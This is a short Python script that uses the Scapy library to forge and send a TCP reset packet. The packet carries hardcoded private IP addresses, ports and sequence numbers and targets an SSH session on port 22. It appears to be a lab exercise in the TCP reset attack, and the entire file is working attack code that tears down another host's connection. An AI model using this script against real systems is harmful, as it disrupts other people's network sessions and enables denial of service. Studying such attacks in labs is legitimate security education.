from scapy.all import *

src_ip = "172.18.224.1"
dst_ip = "172.18.229.8"
src_port = 53012
dst_port = 22

seq_num = 769776641
ack_num = 3547997155

rst_packet = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="R", seq=seq_num, ack=ack_num)

send(rst_packet, verbose=True)